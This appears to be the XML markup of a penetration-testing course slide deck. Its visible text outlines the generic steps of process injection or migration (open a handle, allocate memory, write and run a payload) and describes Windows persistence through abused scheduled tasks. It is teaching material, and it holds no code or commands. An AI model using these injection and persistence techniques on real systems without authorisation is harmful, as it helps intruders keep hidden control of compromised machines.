                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1024" name="Google Shape;1024;p119"/>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Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1025" name="Google Shape;1025;p119"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="447525" y="3414390"/>
            <a:ext cx="776900" cy="486300"/>
            <a:chOff x="457200" y="1466425"/>
            <a:chExt cx="776900" cy="486300"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1026" name="Google Shape;1026;p119"/>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082D49"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto Light"/>
                  <a:ea typeface="Roboto Light"/>
                  <a:cs typeface="Roboto Light"/>
                  <a:sym typeface="Roboto Light"/>
                </a:rPr>
                <a:t>04</a:t>
              </a:r>
              <a:endParaRPr i="0" sz="3000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="082D49"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1027" name="Google Shape;1027;p119"/>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Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1028" name="Google Shape;1028;p119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1342875" y="144982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600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1029" name="Google Shape;1029;p119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1342875" y="210468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sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1030" name="Google Shape;1030;p119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1342875" y="275953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sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1031" name="Google Shape;1031;p119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1342875" y="3414393"/>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sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1032" name="Google Shape;1032;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="1442125"/>
            <a:ext cx="7116000" cy="4863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1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1033" name="Google Shape;1033;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="2100825"/>
            <a:ext cx="7116000" cy="4863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1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1034" name="Google Shape;1034;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="2757613"/>
            <a:ext cx="7116000" cy="4863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1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1035" name="Google Shape;1035;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="3416313"/>
            <a:ext cx="7116000" cy="4863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1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1036" name="Google Shape;1036;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="368950" y="51200"/>
            <a:ext cx="84633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Process Migration</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2600">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We can use many techniques for process migration and injection. However, at the base, they are all similar and leverage the Windows API. They work as follows:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1037" name="Google Shape;1037;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="3416313"/>
            <a:ext cx="7116000" cy="48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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Run the new payload contents in the target process.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1038" name="Google Shape;1038;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="2761463"/>
            <a:ext cx="7116000" cy="48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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Write the payload contents into the newly allocated section of memory </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>in the target process.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1039" name="Google Shape;1039;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="2104663"/>
            <a:ext cx="7116000" cy="48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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Allocate memory in the target process.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1040" name="Google Shape;1040;p119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361800" y="1444013"/>
            <a:ext cx="7116000" cy="48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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Open a handle to a target process.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>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044" name="Shape 1044"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1045" name="Google Shape;1045;p120"/>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1046" name="Google Shape;1046;p120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3731050" y="1119050"/>
            <a:ext cx="1681800" cy="1681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120"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2920725"/>
            <a:ext cx="8520600" cy="75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4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Instructor Demonstration</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1048" name="Google Shape;1048;p120"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3985781" y="1583750"/>
            <a:ext cx="1172338" cy="752400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1049" name="Google Shape;1049;p120"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3514625"/>
            <a:ext cx="9144000" cy="914700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Process migration</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="3100">
              <a:solidFill>
                <a:schemeClr val="accent2"/>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057" name="Shape 1057"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1058" name="Google Shape;1058;p122"/>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0" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Windows Persistence</a:t>
            </a:r>
            <a:endParaRPr b="0">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1059" name="Google Shape;1059;p122"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4091103" y="1506240"/>
            <a:ext cx="961658" cy="965616"/>
            <a:chOff x="1256475" y="298900"/>
            <a:chExt cx="5107050" cy="5117200"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1060" name="Google Shape;1060;p122"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1256475" y="298900"/>
              <a:ext cx="2421800" cy="2421825"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="96873" w="96872">
                  <a:moveTo>
                    <a:pt x="1" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="96872" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96872" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="1"/>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122"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3941725" y="298900"/>
              <a:ext cx="2421800" cy="2421825"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="96873" w="96872">
                  <a:moveTo>
                    <a:pt x="0" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="96871" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96871" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1"/>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122"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1256475" y="2994275"/>
              <a:ext cx="2421800" cy="2421825"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="96873" w="96872">
                  <a:moveTo>
                    <a:pt x="1" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="96872" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96872" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="1"/>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122"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3941725" y="2994275"/>
              <a:ext cx="2421800" cy="2421825"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="96873" w="96872">
                  <a:moveTo>
                    <a:pt x="0" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="96871" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96871" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="96872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1"/>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067" name="Shape 1067"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1068" name="Google Shape;1068;p123"/>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Windows Persistence</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1069" name="Google Shape;1069;p123"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3693675" y="875812"/>
            <a:ext cx="5176000" cy="3940075"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1070" name="Google Shape;1070;p123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="139850" y="1122950"/>
            <a:ext cx="3389100" cy="34458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sz="1800"/>
              <a:t>The concept and purpose of persistence is the same in Windows as it is in Linux: </a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800"/>
              <a:t>To establish a continuous method of access to the compromised machine or network in case the initial connection is severed.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800"/>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p124"/>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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Windows Persistence</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1076" name="Google Shape;1076;p124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="76200" y="583675"/>
            <a:ext cx="8832300" cy="3909000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="275"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>We can establish persistence by abusing Task Scheduler. Scheduled tasks in Windows are similar to cronjobs in Linux; they are programmable tasks that can be executed at a defined interval. By default, Windows has significantly more default scheduled-task jobs created than Linux. This gives the penetration tester a chance to blend in with existing scheduled tasks.</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1077" name="Google Shape;1077;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1569000" y="4592875"/>
            <a:ext cx="2630700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1078" name="Google Shape;1078;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1987025" y="4335725"/>
            <a:ext cx="2205600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1079" name="Google Shape;1079;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2397150" y="3975875"/>
            <a:ext cx="1806600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1080" name="Google Shape;1080;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2812525" y="3668975"/>
            <a:ext cx="1391400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1081" name="Google Shape;1081;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1574275" y="2748125"/>
            <a:ext cx="0" cy="1854600"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1082" name="Google Shape;1082;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1992425" y="2748125"/>
            <a:ext cx="0" cy="1597500"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
